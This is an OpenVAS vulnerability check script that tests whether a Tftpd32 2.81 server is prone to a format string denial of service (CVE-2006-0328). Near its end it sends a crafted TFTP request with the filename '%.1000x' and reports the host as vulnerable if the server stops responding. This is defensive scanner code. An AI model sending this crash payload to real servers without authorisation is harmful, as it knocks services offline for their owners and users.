###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_tftpd32_req_format_string_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# TFTPD32 Request Error Message Format String Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to cause a denial of service.
  Impact Level: Application";
tag_affected = "Tftpd32 version 2.81";
tag_insight = "The flaw is due to a format string error when the filename received in
  a TFTP request is used to construct an error message. This can be exploited
  to crash the application via a TFTP request packet containing a specially
  crafted filename.";
tag_solution = "Upgrade to Tftpd32 version 2.8.2 or later,
  For updates refer to http://tftpd32.jounin.net/";
tag_summary = "This host is running TFTPD32 and is prone to format string
  vulnerability.";

if(description)
{
  script_id(902835);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2006-0328");
  script_bugtraq_id(16333);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-05-23 14:14:14 +0530 (Wed, 23 May 2012)");
  script_name("TFTPD32 Request Error Message Format String Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/22661");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/18539");
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/632633");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/24250");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/1424");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/422405");

  script_description(desc);
  script_summary("Determine if Tftpd32 is prone to a denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Denial of Service");
  script_require_ports("Services/udp/tftp");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("tftp.inc");

## Get TFTP Port
port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

## Check TFTP Port Status
if(tftp_alive(port:port))
{
  ## Sending Exploit
  tftp_get(path:"%.1000x", port:port);

  ## Check Tftpd is dead or not.
  if(!tftp_alive(port:port)) {
    security_warning(port:port,proto:"udp");
  }
}
